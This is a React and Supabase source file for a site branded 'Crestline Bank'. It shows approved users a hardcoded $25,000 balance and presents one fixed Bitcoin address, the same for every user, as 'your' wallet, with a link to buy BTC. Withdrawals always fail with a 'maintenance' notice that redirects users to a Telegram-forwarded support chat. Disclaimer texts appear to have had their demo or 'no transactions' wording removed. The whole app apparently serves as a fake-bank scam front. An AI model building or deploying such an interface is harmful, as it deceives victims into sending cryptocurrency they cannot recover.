import { useEffect, useState } from 'react'
import { supabase } from './supabase'
import './App.css'

function App() {
  const [session, setSession] = useState(null)
  const [loading, setLoading] = useState(true)

  // Auth
  const [authMode, setAuthMode] = useState('login')
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [confirmPassword, setConfirmPassword] = useState('')
  const [fullName, setFullName] = useState('')
  const [authLoading, setAuthLoading] = useState(false)
  const [authMessage, setAuthMessage] = useState('')

  // Approval
  const [approved, setApproved] = useState(false)
  const [checkingApproval, setCheckingApproval] = useState(false)

  // Support
  const [showSupport, setShowSupport] = useState(false)
  const [supportMessage, setSupportMessage] = useState('')
  const [sendingMessage, setSendingMessage] = useState(false)
  const [messages, setMessages] = useState([])

  // Wallet / Withdraw pages
  const [showWallet, setShowWallet] = useState(false)
  const [showWithdraw, setShowWithdraw] = useState(false)

  // Your demo BTC wallet address
  const walletAddress =
    'bc1qwx90w9s588gyev4qrw45fe57gq5pwrhctte8f2'

  // --------------------------------------------------
  // CHECK LOGIN SESSION
  // --------------------------------------------------

  useEffect(() => {
    let mounted = true

    async function loadSession() {
      const {
        data: { session },
      } = await supabase.auth.getSession()

      if (!mounted) return

      setSession(session)
      setLoading(false)
    }

    loadSession()

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange(
      (_event, newSession) => {
        if (!mounted) return

        setSession(newSession)
        setLoading(false)
      }
    )

    return () => {
      mounted = false
      subscription.unsubscribe()
    }
  }, [])

  // --------------------------------------------------
  // CHECK ACCOUNT APPROVAL
  // --------------------------------------------------

  useEffect(() => {
    let mounted = true

    async function checkApproval() {
      if (!session?.user?.id) {
        setApproved(false)
        return
      }

      setCheckingApproval(true)

      const { data, error } = await supabase
        .from('profiles')
        .select('approved')
        .eq('id', session.user.id)
        .maybeSingle()

      if (!mounted) return

      if (error) {
        console.error('Approval check error:', error)
        setApproved(false)
      } else {
        setApproved(data?.approved === true)
      }

      setCheckingApproval(false)
    }

    checkApproval()

    return () => {
      mounted = false
    }
  }, [session?.user?.id])

  // --------------------------------------------------
  // LOAD USER SUPPORT MESSAGES
  // --------------------------------------------------

  async function loadMessages() {
    if (!session?.user?.id) {
      return
    }

    const { data, error } = await supabase
      .from('support_messages')
      .select('*')
      .eq('user_id', session.user.id)
      .order('created_at', {
        ascending: true,
      })

    if (error) {
      console.error('Could not load messages:', error)
      return
    }

    setMessages(data || [])
  }

  useEffect(() => {
    if (!session?.user?.id || !approved) {
      setMessages([])
      return
    }

    loadMessages()

    const interval = setInterval(() => {
      loadMessages()
    }, 3000)

    return () => {
      clearInterval(interval)
    }
  }, [session?.user?.id, approved])

  // --------------------------------------------------
  // SIGN IN
  // --------------------------------------------------

  async function handleLogin(e) {
    e.preventDefault()

    setAuthMessage('')
    setAuthLoading(true)

    const cleanEmail = email.trim()

    const { data, error } =
      await supabase.auth.signInWithPassword({
        email: cleanEmail,
        password,
      })

    setAuthLoading(false)

    if (error) {
      console.error('Login error:', error)

      setAuthMessage(
        error.message ||
          'Unable to sign in. Please check your details.'
      )

      return
    }

    setSession(data.session)

    setEmail('')
    setPassword('')
  }

  // --------------------------------------------------
  // CREATE ACCOUNT
  // --------------------------------------------------

  async function handleSignUp(e) {
    e.preventDefault()

    setAuthMessage('')

    if (!fullName.trim()) {
      setAuthMessage('Please enter your name.')
      return
    }

    if (!email.trim()) {
      setAuthMessage('Please enter your email.')
      return
    }

    if (password.length < 6) {
      setAuthMessage(
        'Password must be at least 6 characters.'
      )
      return
    }

    if (password !== confirmPassword) {
      setAuthMessage('Passwords do not match.')
      return
    }

    setAuthLoading(true)

    const cleanEmail = email.trim()

    const {
      data,
      error,
    } = await supabase.auth.signUp({
      email: cleanEmail,
      password,
      options: {
        data: {
          full_name: fullName.trim(),
        },
      },
    })

    setAuthLoading(false)

    if (error) {
      console.error('Sign up error:', error)

      setAuthMessage(
        error.message ||
          'Unable to create your account.'
      )

      return
    }

    if (data.session) {
      setSession(data.session)

      setEmail('')
      setPassword('')
      setConfirmPassword('')
      setFullName('')
    } else {
      setAuthMessage(
        'Account created. Please check your email to confirm your account, then sign in.'
      )

      setAuthMode('login')
      setPassword('')
      setConfirmPassword('')
    }
  }

  // --------------------------------------------------
  // LOG OUT
  // --------------------------------------------------

  async function handleLogout() {
    await supabase.auth.signOut()

    setSession(null)
    setApproved(false)
    setShowSupport(false)
    setShowWallet(false)
    setShowWithdraw(false)
    setMessages([])
    setSupportMessage('')
    setEmail('')
    setPassword('')
    setConfirmPassword('')
    setFullName('')
  }

  // --------------------------------------------------
  // SEND SUPPORT MESSAGE
  // --------------------------------------------------

  async function handleSendMessage() {
    const message = supportMessage.trim()

    if (!message) {
      return
    }

    if (!session?.user?.id) {
      alert('Please sign in first.')
      return
    }

    setSendingMessage(true)

    const userId = session.user.id

    const temporaryMessage = {
      id: `temporary-${Date.now()}`,
      user_id: userId,
      message,
      reply_text: null,
      created_at: new Date().toISOString(),
      temporary: true,
    }

    setMessages((previous) => [
      ...previous,
      temporaryMessage,
    ])

    setSupportMessage('')

    const { data, error } = await supabase
      .from('support_messages')
      .insert([
        {
          user_id: userId,
          message,
          customer_name:
            session.user.user_metadata?.full_name ||
            session.user.email ||
            'Customer',
        },
      ])
      .select()
      .single()

    if (error) {
      console.error(
        'Supabase message error:',
        error
      )

      setMessages((previous) =>
        previous.filter(
          (item) =>
            item.id !== temporaryMessage.id
        )
      )

      setSupportMessage(message)
      setSendingMessage(false)

      alert(
        'Unable to send the message. Please try again.'
      )

      return
    }

    setMessages((previous) =>
      previous.map((item) =>
        item.id === temporaryMessage.id
          ? data
          : item
      )
    )

    // Telegram notification
    try {
      const {
        error: telegramError,
      } = await supabase.functions.invoke(
        'send-telegram',
        {
          body: {
            message,
            support_message_id: data.id,
            user_id: userId,
            customer_email:
              session.user.email,
          },
        }
      )

      if (telegramError) {
        console.error(
          'Telegram notification error:',
          telegramError
        )
      }
    } catch (telegramError) {
      console.error(
        'Telegram function error:',
        telegramError
      )
    }

    setSendingMessage(false)
  }

  // --------------------------------------------------
  // SUPPORT SCREEN
  // --------------------------------------------------

  function SupportBox() {
    return (
      <div className="messages-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowSupport(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            C
          </div>

          <div className="messages-title">

            <strong>
              Customer Support
            </strong>

            <span>
              ● Online
            </span>

          </div>

        </div>

        <div className="messages-conversation">

          {messages.length === 0 && (
            <div className="conversation-intro">

              <div className="intro-icon">
                💬
              </div>

              <h2>
                Customer Support
              </h2>

              <p>
                How can we help you?
              </p>

            </div>
          )}

          {messages.map((item) => (
            <div
              className="conversation-group"
              key={item.id}
            >

              {item.message && (
                <div className="message-row customer-row">

                  <div className="message-content">

                    <div className="message-bubble customer-bubble">
                      {item.message}
                    </div>

                    <div className="message-time">
                      {item.temporary
                        ? 'Sending...'
                        : 'Now'}
                    </div>

                  </div>

                </div>
              )}

              {item.reply_text && (
                <div className="message-row support-row">

                  <div className="support-message-content">

                    <div className="message-bubble support-bubble">

                      <strong>
                        Customer Support
                      </strong>

                      <div>
                        {item.reply_text}
                      </div>

                    </div>

                    <div className="message-time support-time">
                      Now
                    </div>

                  </div>

                </div>
              )}

            </div>
          ))}

          <div className="bottom-space" />

        </div>

        <div className="message-input-area">

          <div className="message-input-wrapper">

            <textarea
              value={supportMessage}
              onChange={(e) =>
                setSupportMessage(e.target.value)
              }
              placeholder="Type a message..."
              rows={1}
              disabled={sendingMessage}
              onKeyDown={(e) => {

                if (
                  e.key === 'Enter' &&
                  !e.shiftKey
                ) {
                  e.preventDefault()

                  if (
                    !sendingMessage &&
                    supportMessage.trim()
                  ) {
                    handleSendMessage()
                  }
                }

              }}
            />

            <button
              type="button"
              className="send-message-button"
              disabled={
                sendingMessage ||
                !supportMessage.trim()
              }
              onClick={handleSendMessage}
            >
              {sendingMessage ? '...' : '➤'}
            </button>

          </div>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // WALLET SCREEN
  // --------------------------------------------------

  function WalletBox() {

    async function copyWalletAddress() {
      try {
        await navigator.clipboard.writeText(
          walletAddress
        )

        alert('Wallet address copied!')
      } catch (error) {
        console.error(
          'Copy failed:',
          error
        )

        alert(
          'Unable to copy automatically. Please copy the address manually.'
        )
      }
    }

    return (
      <div className="messages-page wallet-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowWallet(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            ₿
          </div>

          <div className="messages-title">

            <strong>
              Bitcoin Wallet
            </strong>

            <span>
              BTC
            </span>

          </div>

        </div>

        <div className="wallet-content">

          <div className="wallet-icon">
            ₿
          </div>

          <h1>
            Your Bitcoin Wallet
          </h1>

          <p className="wallet-description">
            This is your  Bitcoin wallet address.
          </p>

          <div className="wallet-address-card">

            <p className="wallet-address-label">
              BTC Wallet Address
            </p>

            <div className="wallet-address">
              {walletAddress}
            </div>

            <button
              type="button"
              className="card-button copy-wallet-button"
              onClick={copyWalletAddress}
            >
              📋 Copy Address
            </button>

          </div>

          <div className="wallet-info">

            <strong>
              Important
            </strong>

            <p>
              Only send Bitcoin (BTC) to this
              Bitcoin address. This  wallet
              process  banking
              transactions.
            </p>

          </div>

          <a
            className="card-button changelly-button"
            href="https://changelly.com/buy/btc"
            target="_blank"
            rel="noopener noreferrer"
          >
            ₿ Buy Bitcoin with Changelly
          </a>

          <button
            type="button"
            className="wallet-back-button"
            onClick={() => setShowWallet(false)}
          >
            ← Back to Account
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // WITHDRAW SCREEN
  // --------------------------------------------------

  function WithdrawBox() {
    return (
      <div className="messages-page">

        <div className="messages-header">

          <button
            type="button"
            className="back-button"
            onClick={() => setShowWithdraw(false)}
          >
            ←
          </button>

          <div className="support-avatar">
            $
          </div>

          <div className="messages-title">

            <strong>
              Withdraw
            </strong>

            <span>
              Account Services
            </span>

          </div>

        </div>

        <div className="withdraw-content">

          <div className="withdraw-icon">
            🔧
          </div>

          <h1>
            Withdraw Unavailable
          </h1>

          <p>
            This service is currently unavailable
            because the site is undergoing maintenance.
          </p>

          <div className="maintenance-box">

            <strong>
              Site Maintenance
            </strong>

            <p>
              Please try again later or contact
              Customer Support if you need assistance.
            </p>

          </div>

          <button
            type="button"
            className="card-button"
            onClick={() => {
              setShowWithdraw(false)
              setShowSupport(true)
              loadMessages()
            }}
          >
            💬 Contact Customer Support
          </button>

          <button
            type="button"
            className="wallet-back-button"
            onClick={() => setShowWithdraw(false)}
          >
            ← Back to Account
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // LOADING
  // --------------------------------------------------

  if (loading) {
    return (
      <div className="app">

        <div className="login-card">

          <h1>
            Loading...
          </h1>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // LOGIN / SIGN UP
  // --------------------------------------------------

  if (!session) {

    const isLogin =
      authMode === 'login'

    return (
      <div className="app">

        <div className="login-card">

          <div className="bank-logo">
            ◆
          </div>

          <h1>
            {isLogin
              ? 'Welcome Back'
              : 'Create Account'}
          </h1>

          <p className="subtitle">
            {isLogin
              ? 'Sign in to your account'
              : 'Create your personal account'}
          </p>

          {authMessage && (
            <div className="auth-message">
              {authMessage}
            </div>
          )}

          <form
            onSubmit={
              isLogin
                ? handleLogin
                : handleSignUp
            }
          >

            {!isLogin && (
              <>
                <label>
                  Full Name
                </label>

                <input
                  type="text"
                  value={fullName}
                  onChange={(e) =>
                    setFullName(e.target.value)
                  }
                  placeholder="Enter your name"
                  autoComplete="name"
                />
              </>
            )}

            <label>
              Email
            </label>

            <input
              type="email"
              value={email}
              onChange={(e) =>
                setEmail(e.target.value)
              }
              placeholder="Enter your email"
              autoComplete={
                isLogin
                  ? 'email'
                  : 'new-email'
              }
            />

            <label>
              Password
            </label>

            <input
              type="password"
              value={password}
              onChange={(e) =>
                setPassword(e.target.value)
              }
              placeholder="Enter password"
              autoComplete={
                isLogin
                  ? 'current-password'
                  : 'new-password'
              }
            />

            {!isLogin && (
              <>
                <label>
                  Confirm Password
                </label>

                <input
                  type="password"
                  value={confirmPassword}
                  onChange={(e) =>
                    setConfirmPassword(
                      e.target.value
                    )
                  }
                  placeholder="Confirm password"
                  autoComplete="new-password"
                />
              </>
            )}

            <button
              className="sign-in-button"
              type="submit"
              disabled={authLoading}
            >
              {authLoading
                ? 'Please wait...'
                : isLogin
                ? 'Sign In'
                : 'Create Account'}
            </button>

          </form>

          <button
            type="button"
            className="auth-switch-button"
            onClick={() => {
              setAuthMessage('')

              setAuthMode(
                isLogin
                  ? 'signup'
                  : 'login'
              )
            }}
          >
            {isLogin
              ? "Don't have an account? Create one"
              : 'Already have an account? Sign in'}
          </button>

          <div className="login-footer">

            <span>
              🔒 Secure connection
            </span>

            <span>
              •
            </span>

            <span>
            Crestline Bank
            </span>

          </div>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // CHECKING APPROVAL
  // --------------------------------------------------

  if (checkingApproval) {

    return (
      <div className="app">

        <div className="login-card">

          <h1>
            Please wait...
          </h1>

          <p className="subtitle">
            Checking your account approval.
          </p>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // WAITING FOR APPROVAL
  // --------------------------------------------------

  if (!approved) {

    return (
      <div className="app">

        <div className="login-card">

          <div className="bank-logo">
            ◆
          </div>

          <h1>
            Account Pending
          </h1>

          <p className="subtitle">
            Your account is waiting for approval.
          </p>

          <div className="auth-message">
            Your account has been created successfully.
            Please wait for approval before accessing
            the dashboard.
          </div>

          <button
            type="button"
            className="sign-in-button"
            onClick={handleLogout}
          >
            Sign Out
          </button>

        </div>

      </div>
    )
  }

  // --------------------------------------------------
  // WALLET PAGE
  // --------------------------------------------------

  if (showWallet) {
    return (
      <div className="dashboard">
        {WalletBox()}
      </div>
    )
  }

  // --------------------------------------------------
  // WITHDRAW PAGE
  // --------------------------------------------------

  if (showWithdraw) {
    return (
      <div className="dashboard">
        {WithdrawBox()}
      </div>
    )
  }

  // --------------------------------------------------
  // SUPPORT PAGE
  // --------------------------------------------------

  if (showSupport) {
    return (
      <div className="dashboard">
        {SupportBox()}
      </div>
    )
  }

  // --------------------------------------------------
  // DASHBOARD
  // --------------------------------------------------

  const displayName =
    session.user.user_metadata?.full_name ||
    session.user.email?.split('@')[0] ||
    'Customer'

  return (
    <div className="dashboard">

      <header className="dashboard-header">

        <div>

          <div className="brand">
            ◆Crestline Bank

          </div>

          <span>
            Personal Banking
          </span>

        </div>

        <button
          className="logout-button"
          type="button"
          onClick={handleLogout}
        >
          Log Out
        </button>

      </header>

      <main className="dashboard-content">

        <h1>
          Good to see you, {displayName}
        </h1>

        <p className="welcome-text">
          Welcome to your account.
        </p>

        {/* BALANCE */}

        <section className="balance-card">

          <p>
            Available Balance
          </p>

          <h2>
            $25,000.00
          </h2>

          <span>
             balance
          </span>

        </section>

        <div className="dashboard-grid">

          {/* CUSTOMER SUPPORT */}

          <div className="feature-card">

            <h3>
              💬 Customer Support
            </h3>

            <p>
              Have a question? Contact customer support.
            </p>

            <button
              type="button"
              onClick={() => {
                setShowSupport(true)
                loadMessages()
              }}
              className="card-button"
            >
              Messages
            </button>

          </div>

          {/* BITCOIN WALLET */}

          <div className="feature-card">

            <h3>
              ₿ Bitcoin Wallet
            </h3>

            <p>
              View your BTC wallet address.
            </p>

            <button
              type="button"
              onClick={() => setShowWallet(true)}
              className="card-button"
            >
              Open Wallet
            </button>

          </div>

          {/* WITHDRAW */}

          <div className="feature-card">

            <h3>
              💸 Withdraw
            </h3>

            <p>
              Withdraw funds from your account.
            </p>

            <button
              type="button"
              onClick={() => setShowWithdraw(true)}
              className="card-button"
            >
              Withdraw
            </button>

          </div>

        </div>

        <div className="demo-notice">

          <strong>
            Crestline Bank
          </strong>

          <p>
            This is a  banking interface.
            financial transactions
            are processed.
          </p>

        </div>

      </main>

    </div>
  )
}

export default App